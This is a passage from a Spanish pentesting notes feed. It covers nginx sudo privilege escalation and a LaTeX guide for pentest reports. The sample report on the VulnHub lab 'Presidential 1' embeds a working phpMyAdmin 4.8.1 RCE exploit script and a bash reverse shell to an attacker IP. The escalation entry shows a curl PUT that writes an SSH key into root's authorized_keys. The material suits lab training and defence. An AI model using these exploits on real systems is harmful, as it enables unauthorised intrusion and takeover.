Copy<br>Una vez creado el archivo de configuración deseado, simplemente deberíamos abusar de nuestra posibilidad de ejecutar, por ejemplo, como cualquier usuario la herramienta nginx y cargar este archivo de configuración "malicioso" haciendo uso de la flag -c<br>sudo -u root nginx -c /tmp/nginx.conf
Copy<br>Hecho esto, estariamos exponiendo bajo el puerto indicado (4444) la raíz del sistema ( / ) permitiendo todos los métodos http, por lo que podríamos realizar una solicitud curl para modificar o crear el archivo authorized_keys adjuntando en este nuestra clave ssh pública para posteriormente ganar acceso al sistema sin proporcionar credenciales.<br>curl -s -X PUT http://{target_ip}:4444/root/.ssh/authorized_keys -d "{ssh_key.pub}"
Copy<br>Una vez realizado esto, habríamos modificado el archivo authorized keys adjunto en el directorio root del sistema, lo que nos permitirá ingresar al sistema como root sin proporcionar contraseña gracias a tener nuestra clave pública adjunta en dicho archivo. (<a data-href="0. Linux Basics#Keys in SSH" href="https://dobliuw.com/notes/3.-system/operative-systems/linux/0.-linux-basics.html#Keys_in_SSH" class="internal-link" target="_self" rel="noopener nofollow">0. Linux Basics &gt; Keys in SSH</a>)<br>ssh root@{target_ip}
Copy<br>Esta es solo una manera en la cual podríamos ganar acceso al sistema, pero podemos tener en cuenta que las posibilidades son muchas, como desplegar una web shell, llevar a cabo un log poisoning (<a data-href="LFI - (Local File Inclusion)#Log Poisoning - ( **LFI** migrado a RCE - (Remote Command Execution) )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/lfi-(local-file-inclusion).html#Log_Poisoning_-_(_**LFI**_migrado_a_RCE_-_(Remote_Command_Execution)_)" class="internal-link" target="_self" rel="noopener nofollow">LFI - (Local File Inclusion) &gt; Log Poisoning - ( **LFI** migrado a RCE - (Remote Command Execution) )</a> ), podríamos crear un proxy inverso para interceptar tráfico, etc.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/abusing-web-server-configuration.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Abusing web server configuration.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 23 Jul 2024 13:55:58 GMT</pubDate></item><item><title><![CDATA[Redacción de reporte profesional en LaTeX]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:report" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#report</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:report" class="tag" target="_blank" rel="noopener nofollow">#report</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> 
<br><br>Como vimos en <a data-href="LaTeX Injections" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/latex-injections.html" class="internal-link" target="_self" rel="noopener nofollow">LaTeX Injections</a> ya sabemos que es LaTeX, un lenguaje de marear documentos científicos y técnicos de alta calidad. <br>La idea es que se realizaran documentos pdf en los cuales se redactara un informe profesional de las vulnerabilidades y fallas de seguridad encontradas para el sistema auditado. <br><br><br>El informe técnico es un informe en el cual nos explayamos técnicamente con las vulnerabilidades encontradas, como se explotan, etc.<br><br>El informe ejecutivo es un informe el cual va orientado a los ejecutivos que no terminan de entender técnisismos por lo cual es un informe más "relajado".<br><br><br><br>apt update 
apt install latexmk zathura
apt install texlive-full 

mkdir /home/{user}/.config/latexmk 
echo '$pdf_previewer = "zathura"; ' &gt; /home/{user}/.config/latexmk/latexmkrc
sudo mkdir /root/.config/latexmk 
sudo ln -s -f /home/{user}/.config/latexmk/latexmkrc /root/.config/latexmk/latexmkrc
Copy<br>Los archivos escritos en latex tendrán la terminación .tex, de manera que posteriormente se podrán "compilar" en un formato haciendo uso una vez más de latexmk:<br>latexmk -pdf Documento.tex<br>Pero para no estar habriendolo constantemente con zathura podemos hacer uso de: <br>latexmk -pdf Documento.tex -pvc<br>De manera que podríamos ir editando el documento e ir viendo los cambios en tiempo real. <br><br>`<br><br>% Dependencias 
\usepackage[utf8]{inputenc} % Para poder usar caracteres especiales
\usepackage[spanish]{babel} % Para poder usar caracteres especiales 
\usepackage{graphicx} % Para la inserción de imagenes
\usepackage[table,xcdraw]{xcolor} % Representación de colores
\usepackage{tikz,lipsum,lmodern} % Para la creación de boxes
\usepackage[most]{tcolorbox} % Para la creación de boxes 
\usepackage[margin=2cm, top=2cm, includefoot]{geometry} % Para establecer márgenes del documento
\usepackage{fancyhdr} % Definir el estilo de la página
\usepackage[hidelinks]{hyperref} % Gestion de hipervinculos en el indice
\usepackage{setspace} % Para mayor espacio entre líneas
\setstretch{1.2}
\usepackage{parskip} % Eliminar la sangría 
\usepackage[figurename=Imagen]{caption} % Cambiar el nombre del caption de las figuras por Imagen
\usepackage{ragged2e} % Para volver a acomodar los textos despues de los \centering
\usepackage{listings} % Para la inserción de código


% Centrar contenido 
\centering 

\begin{center}
\end{center}

% Agregar imagen
 \makebox[\textwidth]{\includegraphics[width=\paperwidth]{vulnhub.png}} % Que ocupe de manera correcta todo el espacio del documento 
 \includegraphics[width=0.6\textwidth]{\logoPortada}\par\vspace{0.5cm} % Que la imagen ocupe el width del área de escritura

% Dar espacios 
\vfill

% Negrita
\textbf{hola esto esta en negrita}

% Figuras 
% Las figuras son imagenes a las que se puede hacer referencia así como agregar una descripcion
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{whatweb.png}}
    \caption{Tecnologías web identificadas.}
    \label{fig:identifiedWhatweb}
  \end{figure}

% Hacer referencia a una figura y a una página de la figura
La imagen \ref{fig:identifiedWhatweb} en la página \pageref{fig:identifiedWhatweb}

% Tablas
 \begin{tabular}{ | c | c |}
      \hline
      \textbf{Tecnología} &amp; \textbf{Versión} \\
      \hline
      PHP &amp; 5.5.38 \\
      \hline
      Apache &amp; 2.4.6 \\
      \hline
\end{tabular}

% Items 
\begin{itemize}
	 \item Item 1 
	 \item Item 2 
\end{itemize}

% Espacios verticales 
\vspace{0.5cm}

% Indice 
\tableofcontents
\addto\captionsspanish{\renewcommand{\contentsname}{Índice}} % Renombrar el nombre del indice 

% Nueva pagina 
\clearpage

% Nuevas secciones 
\section{Nombre de la sección}

% Subsecciones
\subsection{Nombre de la subsección}

% Declaración de variables 
\newcommand{\variable}{Valor}

% Definición de colores 
\definecolor{bluePortada}{HTML}{146c8a}

% Darle estilo a la página 
\setlength{\headheight}{40.2pt} % aumentar esapaciado de la bara
\renewcommand{\headrulewidth}{3pt} % Aumentar tamaño de la barra
\renewcommand{\headrule}{\hbox to\headwidth{\color{bluePortada}\leaders\hrule height \headrulewidth\hfill}}
\pagestyle{fancy}
\fancyhf{}
% Agregar logo a la izquierda y a la derecha de todas las páginas 
\lhead{\includegraphics[width=1cm]{image.png}}\rhead{\includegraphics[width=1cm]{image2.png}}

Copy<br>A su vez es importante tener en cuenta que existen páginas como <a data-tooltip-position="top" aria-label="https://www.overleaf.com/" rel="noopener nofollow" class="external-link" href="https://www.overleaf.com/" target="_blank">Overleaf</a> que nos permiten buscar diseños o cosas para agregar a latex como <a data-tooltip-position="top" aria-label="https://es.overleaf.com/learn/latex/Code_listing" rel="noopener nofollow" class="external-link" href="https://es.overleaf.com/learn/latex/Code_listing" target="_blank">inserción de código</a> o <a data-tooltip-position="top" aria-label="https://www.overleaf.com/latex/examples/drawing-coloured-boxes-using-tcolorbox/pvknncpjyfbp" rel="noopener nofollow" class="external-link" href="https://www.overleaf.com/latex/examples/drawing-coloured-boxes-using-tcolorbox/pvknncpjyfbp" target="_blank">cajas de texto</a><br><br><br><br>\documentclass[a4paper]{article} % Formato de plantilla 

\usepackage[utf8]{inputenc} % Para poder usar caracteres especiales
\usepackage[spanish]{babel} % Para poder usar caracteres especiales 
\usepackage{graphicx} % Para la inserción de imagenes
\usepackage[table,xcdraw]{xcolor} % Representación de colores
\usepackage{tikz,lipsum,lmodern} % Para la creación de boxes
\usepackage[most]{tcolorbox} % Para la creación de boxes 
\usepackage[margin=2cm, top=2cm, includefoot]{geometry} % Para establecer márgenes del documento
\usepackage{fancyhdr} % Definir el estilo de la página
\usepackage[hidelinks]{hyperref} % Gestion de hipervinculos en el indice
\usepackage{setspace} % Para mayor espacio entre líneas
\setstretch{1.2}
\usepackage{parskip} % Eliminar la sangría 
\usepackage[figurename=Imagen]{caption} % Cambiar el nombre del caption de las figuras por Imagen
\usepackage{ragged2e} % Para volver a acomodar los textos despues de los \centering
\usepackage{listings} % Para la inserción de código

% Cambiar el nombre de lcaption de la insercion de código 
\renewcommand{\lstlistingname}{Código}

% CONFIGURACIÓN DE COLORES PARA LA INSERCIÓN DE CÓDIGO
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\newtcolorbox{definicion}{ % Para los cuadores de definición
    breakable,
    enhanced,
    colback=white,
    colframe=bluePortada!75!black,
    arc=0mm,
    boxrule=1pt,
    leftrule=12mm,
    fonttitle=\bfseries,
    coltitle=blue!75!black,
    title=Definición,
    attach title to upper=\par,
}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}

\lstset{style=mystyle}

\setlength{\parindent}{0pt}
\setlength{\parskip}{0.8em plus 0.5em minus 0.2em} % Establecer espacio entre párrafos en 1em (un espacio de fuente) más 0.5em de espacio extra permitido, con una reducción máxima de 0.2em
\setlength{\parfillskip}{\parindent plus 1fill}

% DECLARACIÓN DE VARIABLES PERSONALIZADAS
\newcommand{\logoPortada}{vulnhub.png}
\newcommand{\machineName}{Presidential 1}
\newcommand{\logoMachine}{logoMachine.png}
\newcommand{\startDate}{06 de Julio de 2023}
\newcommand{\logo}{hacker.png}
\newcommand{\logoEntity}{logoVulnhub.png}

% DEFINICIÓN DE COLORES
\definecolor{bluePortada}{HTML}{146c8a}


% CAMBIAR INIDCE 
\addto\captionsspanish{\renewcommand{\contentsname}{Índice}}

% ESTILO DE LA PÁGINA
\setlength{\headheight}{40.2pt} % aumentar esapaciado de la bara
\renewcommand{\headrulewidth}{3pt} % Aumentar tamaño de la barra
\renewcommand{\headrule}{\hbox to\headwidth{\color{bluePortada}\leaders\hrule height \headrulewidth\hfill}}
\pagestyle{fancy}
\fancyhf{}
% Agregar logo 
\lhead{\includegraphics[width=1cm]{\logo}}\rhead{\includegraphics[width=1cm]{\logoEntity}}


\begin{document} % Inicio del documento

\cfoot{\thepage} % Para ver la numeración de las páginas

\begin{titlepage}
  \centering
  %\makebox[\textwidth]{\includegraphics[width=\paperwidth]{vulnhub.png}} % Que ocupe de manera correcta todo el espacio del documento 
  \includegraphics[width=0.6\textwidth]{\logoPortada}\par\vspace{0.5cm} % Que la imagen ocupe el width del área de escritura
    % El par es como un salto de línea mientras que el vspace viene de Vertical Space para asignar el espacio 
    {\scshape\LARGE  \textbf{Informe Técnico}\par\vspace{0.4cm}} % Con LARGE más grande y textbf en negrita
    {\Huge\textcolor{bluePortada}{\textbf{Máquina {\machineName}}}} % Huge para la tipografia más grande
    \vfill\vfill
    \includegraphics[width=\textwidth, height=10cm, keepaspectratio]{\logoMachine}
    \vfill\vfill
    \begin{tcolorbox}[colback=red!5!white,colframe=red!75!black]
      \centering
      Este documento es confidencial y contiene información sensible.\\No debería ser impreso o compartido con terceras entidades. % El \\ indica un salgo de línea
    \end{tcolorbox}
    \vfill
    {\large \startDate}
    \vfill
  \end{titlepage}

  % ---------------------------------------- INDICE --------------------------------------
  % Nueva pagina
  \clearpage
  \tableofcontents
  \clearpage
  % --------------------------------------------------------------------------------------
  \section{Antecedentes}
   El presente documento toma los resultados obtenidos durante la fase de auditoría realizada a la máquina \textbf{\machineName}, enumerando todos los vectores de ataque encontrados así como la explotación realizada para cada uno de estos.

   Esta máquina a sido descargada de la plataforma de \href{https://vulnhub.com}{\textbf{\color{bluePortada}Vulnhub}}, una plataforma de entrenamiento y práctica para personas interesadas en la seguridad informática y en el hacking ético.

   A continuación, se proporciona el enlace directo de descarga de la máquina:

   \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
  colback=blue!5!white,colframe=blue!75!black,colbacktitle=bluePortada!80!black,
  title=Dirección URL de \machineName,fonttitle=\bfseries,
  boxed title style={size=small,colframe=blue!50!black} ]
  \centering
     \href{https://www.vulnhub.com/entry/presidential-1,500/}{\textbf{\color{bluePortada}https://www.vulnhub.com/entry/presidential-1,500}}
  \end{tcolorbox}
  \vspace{0.5cm}
  \begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{presidential-image.png}}
    \caption{Página principal del servicio web de la máquina expuesto por el puerto 80.}
  \end{figure}

  \section{Objetivos}

  Los objetivos de la presente auditoría de seguridad se enfocan en la identiciación de posibles vulnerabilidades y debilidades en la máquina \textbf{\color{bluePortada}\machineName}, con el propósito de garantizar la integridad y confidencialidad de la información almacenada en ella.

  Con este fin, se ha llevado a cabo un análisis exhaustivo de todos los servicios detectados que se encontraban expuestos en dicho servidor, recopilando la información detallada sobre aquellos que representan un riesgo potencial desde el punto de vista de la seguridad.
  \clearpage
  
  %2.1
  \subsection{Alcance}
  A continuación se representan los objetivos a cumplir para esta auditoría:
  \begin{itemize}
    \item Identificar los puertos y servicios vulnerables.
    \item Realiar una explotación de las vulnerabilidades encontradas.
    \item Conseguir acceso al servidor mediante la explotación de los servicios vulnerables identificados.
    \item Enumerar vías potenciales de elevar privilegios en el sistema una vez este ha sido vulnerado.
  \end{itemize}
  
  % 2.2
  \subsection{Impedimentos y limitaciones}
  Durante el proceso de auditoría, se dejo en claro que está terminantemente prohibido realizar cualquiera de las siguientes actividades:
  \begin{itemize}
    \item Realizar tareas que puedan ocacionar una \textbf{DoS (Denegación de servicio)} o afectar a la disponibilidad de los servicios expuestos
    \item Borrar archivos residentes en el servidor una vez este hay sido vulnerado
  \end{itemize}

  \clearpage 

  \section{Reconocimiento}
  \subsection{Enumeración de servicios expuestos}
  
  A continuación, se adjunta una evidencia de los puertos y servicios identificados durante el reconocimiento aplicado con la herramienta \textbf{Nmap}: 

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{ports.png}}
    \caption{Puertos enumerados.}
  \end{figure}
  \vspace{0.3cm}
  En este caso se identificaron dos puertos activos corriendo por el protocolo TCP:
  
  \vspace{0.8cm}
  
  \centering
  \begin{tikzpicture}[node distance=2cm, every node/.style={rectangle, draw, fill=white}]
    \node (center) {TCP};
    \node (port1) [below left of=center, node distance=3cm] {Puerto 80};
    \node (port2) [below right of=center, node distance=3cm] {Puerto 2082};
    \draw (center) -- (port1);
    \draw (center) -- (port2);
  \end{tikzpicture}

  \vspace{0.5cm}
  \justifying

  Asimismo no se encontraron puertos expuestos a través de otros protocolos, por lo que se priorizará la evaluación de los puertos identificados en el primer escaneo efectuado. 

  \clearpage 

  \subsection{Enumeración del servicio web}

  A continuación se representan los resultados obtenidos con la herramineta \textbf{WhatWeb}, una herramienta de reconocimiento web que se utiliza para identificar tecnologías web específicas que se emplean en un sitio web, tras aplica un reconocimiento sobre el servicio HTTP corriendo por el puerto 80:

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{whatweb.png}}
    \caption{Tecnologías web identificadas.}
    \label{fig:identifiedWhatweb}
  \end{figure}

  En los resultados obtenidos, es posible identificar lsa versiones para algunas de las tecnologías existentes:

  \vspace{0.4cm}
  \centering
  \begin{center}
    \begin{tabular}{ | c | c |}
      \hline
      \textbf{Tecnología} &amp; \textbf{Versión} \\
      \hline
      PHP &amp; 5.5.38 \\
      \hline
      Apache &amp; 2.4.6 \\
      \hline
    \end{tabular}
  \end{center}
  \vspace{0.4cm}
  \justifying

  Dentro de la información representada, también es posible identificar dos correos electrónicos, los cuales podrían ser utilizados de cara a un ataque de \textbf{Phishing}:

  \vspace{0.3cm}
  \begin{center}
    \texttt{contact@example.com} \qquad \texttt{contact@votenow.local}
  \end{center}

  \vspace{0.3cm}

  El \textbf{Phishing} es un tipo de ataque informático que se utiliza para engañar a las personas y obtener información confidencial, como contraseñas, información bancaria o detalles de tarjetas de crédito. El ataque se lleva a cabo mediante el envío de correos electrónicos fraudulentos o mensajes de texto que parecen legítimos y qeu solicitan al destinatario que proporcione información personal o confidencial.

 Adicionalmente también ha sido posible identificar la versión de \textbf{Centos} que se encunetra activa a través de un reconomiento exhaustivo realizado sobre el servidor web con la herramienta \textbf{wig}:

 \begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{wig.png}}
    \caption{Versión de CentOS detectada.}
    \label{fig:identifiedWig}
  \end{figure}
  
  \clearpage

  \subsection{Enumeración de subdominios}
  Una vez identificado el dominio '\textbf{votenow.local}' gracias a los correos electrónicos hayados en la identificación de las tecnologías web en la imagen \ref{fig:identifiedWhatweb} de la página \pageref{fig:identifiedWhatweb}, se procedió a aplicar un ataque de \textbf{fuerza bruta} sobre el dominio principal con el objetivo de identificad subdominios válidos.

  Una vez finalizado el ataque de fuerza bruta, estos fueron los resultados obtenidos:

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{subdomains.png}}
    \caption{Subdominios identificados con gobuster.}
    \label{fig:identifiedSubdomains}
  \end{figure}

  \vspace{0.3cm}

  Se identificó el subdominio '\textbf{datasafe.votenow.local}' como un subdominio válido. Este subdominio representó un punto crucial en la auditoría, dado que fue a través de este qeu se consiguió ingresar al sistema mediante la explotación de vulnerabilidad existente en \textbf{PhpMyAdmin}.

  Cabe destacar que para estos dominios y subdominios fuese accesibles, fue necesario incorporar el siguiente contenido en el archivo '\textbf{/etc/hosts}':

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{etchosts.png}}
    \caption{Contenido agregado al /etc/hosts.}
    \label{fig:identifiedEtchosts}
  \end{figure}

  Esto es así dado que se está aplicando '\textbf{Virtual Hosting}', una técnica utilizada en servidores web para alojar múltiples sitios web en una sola máquina física. El archivo '\textbf{/etc/hosts}' se utiliza para asociar el nombre de domino de cada sitio web con la dirección IP del servidor. 

  Si no se especifica esta asociación, el servidor web no podrá determinar el sitio web correcto para servir, respondiendo con un error o un sitio web incorrecto.

  \clearpage 
  \subsection{Enumeración de paneles de autentiación}

  Una vez descubierto el subdominio '\textbf{datasafe.votenow.local}' representado en la imagén \ref{fig:identifiedSubdomains} de la página \pageref{fig:identifiedSubdomains}, se encontró el siguiente panel de autenticación de \textbf{PhpMyAdmin}:

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{phpmyadmin.png}}
    \caption{Panel de autentiación hayado en el subdominio '\textbf{datasafe.votenow.local}'.}
    \label{fig:identifiedPhpMyAdmin}
  \end{figure}

\vspace{0.6cm}
\section{Identificación y explotación de vulnerabilidades} 
\subsection{Archivo backup expuesto}

Durante una fase de reconocimiento con la herramienta \textbf{gobuster}, se identificó un archivo de Backup expuesto en el servidor.

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{gobusterBackup.png}}
    \caption{Resultado arrojado por gobuster trás la enumeración de archivos con extensión '\textbf{.php.bak}'.}
    \label{fig:identifiedGobusterBackup}
  \end{figure}

  Tras verificar dicho archivo en el navegador para validar si este disponía de información sensible la cual pudiera suponer un riesgo desde el punto de vista de la seguridad, se determinó que el archivo contaba con la siguiente información privilegiada:

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{Backup.png}}
    \caption{Credenciales de acceso a la base de datos.}
    \label{fig:identifiedBackup}
  \end{figure}

Estas credenciales corresponden a las credenciales de acceso a la base de datos, las cuales a su vez, debido a una reutilización de usuario y contraseña, permitieron ingresar al panel de autenticación de \textbf{PhpMyAdmin} representado en la imagen \ref{fig:identifiedPhpMyAdmin} de la página \pageref{fig:identifiedPhpMyAdmin}.

\vspace{0.4cm}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{phpmyadminAccess.png}}
    \caption{Inicio de sesión en el panel de autentiación \textbf{PhpMyAdmin}.}
    \label{fig:identifiedPhpMyAdminAccess}
  \end{figure}

\clearpage

\subsection{Explotación del panel de autentiación PhpMyAdmin}

Una vez ingresado al \textbf{PhpMyAdmin} fue posible identificar la versión actualmente en uso: 

\vspace{0.4cm}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{phpmyadminversion.png}}
    \caption{Version de \textbf{PhpMyAdmin} en uso.}
    \label{fig:identifiedPhpMyAdminVersion}
  \end{figure}

Esta versión corresponde a una \textbf{versión antigua} de PhpMyAdmin, lo que lo expone a varías \textbf{vulnerabilidades críticas} identificadas: 

\vspace{0.4cm}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{phpmyadminvulns.png}}
    \caption{Vulnerabilidades para la versión 4.8.1 de \textbf{PhpMyAdmin}.}
    \label{fig:identifiedPhpMyAdminVulns}
  \end{figure}

Entre ellas, nos encontramos con la vulnerabilidad \textbf{RCE (Remote Code Execution)} la cual le permite a un atacante mal intencionado \textbf{ejecutar código} remoto \textbf{en el servidor}.

\clearpage

A continuación se comparte el script en Python3 que fue utilizado para lograr ejecutar código remoto en el servidor:

\vspace{0.3cm}

\begin{lstlisting}[language=Python, caption=Exploit para la versión 4.8.1 de PhpMyAdmin]
#!/usr/bin/python3

import re, requests, sys, html

def get_token(content):
  s = re.search('token"\s*value="(.*?)"', content)
  token = html.unescape(s.group(1))
  return token

ipaddr = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]
command = sys.argv[6]

url = "http://{}:{}{}".format(ipaddr,port,path)

url1 = url + "/index.php"
r = requests.get(url1)
content = r.content.decode('utf-8')

s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
version = s.group(1)

cookies = r.cookies
token = get_token(content)

p = {'token': token, 'pma_username': username, 'pma_password': password}
r = requests.post(url1, cookies = cookies, data = p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+),', content)
logged_in = s.group(1)

cookies = r.cookies
token = get_token(content)

url2 = url + "/import.php"
payload = '''select '&lt;?php system("{}") ?&gt;';'''.format(command)
p = {'table':'', 'token': token, 'sql_query': payload }
r = requests.post(url2, cookies = cookies, data = p)

session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)

content = r.content.decode('utf-8', errors="replace")
s = re.search("select '(.*?)\n'", content, re.DOTALL)
if s != None:
  print(s.group(1))

\end{lstlisting}

\clearpage 

Una vez que ejecutemos el script adjuntandole a este el comando deseado a inyectar, podrémos (Una vez verificada la ejecución de comandos), ganar completo acceso al sistema:

\vspace{0.4cm}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{rce.png}}
    \caption{Ganando acceso al servidor a través de la explotación de la vulnerabilidad de PhpMyAdmin.}
    \label{fig:identifiedRce}
  \end{figure}

En este caso de esta ejecutando el scrip inyectando el comando '\textbf{curl 192.168.1.38}' para que realize una petición a mi equipo el cual hostea un script en bash el cual será solicitado por el servidor a la par que interpretado, el cual garantizará el acceso al sistema: 

\vspace{0.3cm}
\begin{lstlisting}[language=bash, caption=Script en Bash encargado de envíar a un puerto del atacante una consola interactiva.]
#!/bin/bash

bash -i &gt;&amp; /dev/tcp/192.168.1.38/443 0&gt;&amp;1
\end{lstlisting}
\vspace{0.3cm}

Este script esta alojado en el servidor del atacante, evitando de esta forma dejar archivos residuales en el servidor víctima. Una vez ejecutado el comando, el atacante gana acceso al servidor, teniendo control de la máquina en este caso como el usuario '\textbf{apache}'.

Tal y como se puede apreciar en el script de python, principalmente lo que sucede es que el script se aprovecha de una vulnerabilidad de tipo \textbf{LFI} existente en esta versión de PhpMyAdmin para conseguir la ejecución remota de comandos:

\vspace{0.3cm}
\begin{lstlisting}[language=Python, caption=Porción del codigo correspondiente a la explotación del LFI.]
session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)
\end{lstlisting}

  \begin{definicion}
    LFI (\textbf{Local File Inclusion}) Es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante acceder a archivos locales del servidor a través de la inclusión de archivos locales en una página web.
  \end{definicion}

\clearpage

A través del LFI, se consigue apuntar a un recurso de el cual almacena sesiones que representan información relacionada con las diferentes sesiones activas en el uso del lado de los usuarios.

Aprovechando esta lectura y la propia sesión del usuario, lo qeu se hace es que através de una \textbf{query SQL}m se logra introducir una consulta la cual  contiene código PHP, visible desde los archivos de sesión del usuario a través del LFI. Esto en consecuencia conduce a una ejecución remota de comandos, dado que el código PHP es interpretado por el servidor.

\section{Escalada de privilegios}

\section{Contramedidas y buenas prácticas}
Con el objetivo de evitar posibles explotaciones indeseadas en el servidor expuesto, se enumeran a continuación las buneas prácticas a llevar a cabo para las diferentes vulnerabilidades descubiertas. 

\subsection{PhpMyAdmin 4.8.1 vulnerable}
PhpMyAdmin es una herramienta popular para administrar bases de datos MySQL a través de una interfaz web. Sin embargo, la versión 4.8.1 de PhpMyAdmin posee vulnerabilidades conocidas dentro de las cuales como vimos puede permitir a un atacante ejecutar código arbitrario en el servidor web donde está alojado. 

Para corregir esta vulnerabilidad, es necesario actualizar a la versión más actual de PhpMyAdmin. Si por alguna razón no es posible actualizar a la última versión, se pueden tomar algunas medidas para mittigar el riesgo de explotación

\begin{itemize}
  \item Corregir el código del script '\textbf{index.php}' para que la variable '\textbf{target}' proporcionada por el usuario esté bien controlada. 
\end{itemize}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{lfi_fix.png}}
    \caption{Parámetro target vulnerable a \textbf{LFI}.}
    \label{fig:identifiedRce}
  \end{figure}

  \begin{itemize}
    \item En lugar de permitir que el usuario especifique cualquier archivo que desee incluir, definir una lista de arachivos permiitidos y comprobar que el valor pasado al parámetro '\textbf{target}' esté en la lista antes de incluir el archivo. 
\end{itemize}

\clearpage
\section{Conclusiones}

Se han detectado \textbf{vulnerabilidades críticas} que pueden suponer un riesgo desde el punto de vista de la seguridad. Han sido encontradas vulnerabilidades las cuales permitieron vulnerar la integridad del servidor, consiguiendo acceso al mismo como el usuario '\textbf{apache}'. 

Esto ha sido posible debido a una versión vulnerable de PhpMyAdmin existente en uno de los subdominios identificados durante la fase de reconocmiento bajo el dominio '\textbf{votenow.local}'.

Se recomienda encarecidamente aplicar las contramedidas recomendadas para corregir estas vulnerabilidades lo antes posible, dado qeu de lo contrario se podría comprometer la seguridad del servidor y poner en riesgo la integridad de todos los datos almacenados en este.

\end{document} % Fin del documento

Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/4.-report/redacción-de-reporte-profesional-en-latex.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/4. Report/Redacción de reporte profesional en LaTeX.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:34:23 GMT</pubDate></item><item><title><![CDATA[Atajos de consola]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:linux" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#linux</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:atajos" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#atajos</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:linux" class="tag" target="_blank" rel="noopener nofollow">#linux</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:atajos" class="tag" target="_blank" rel="noopener nofollow">#atajos</a> 
<br><br><br>
<br>

Mover el cursor al inicio de la línea. 

<br>

Mover el cursor al final de la línea. 

<br>

Mover el cursor al inicio de la siguiente palabra. 

<br>

Mover el cursor una palabra para atras. 

<br>

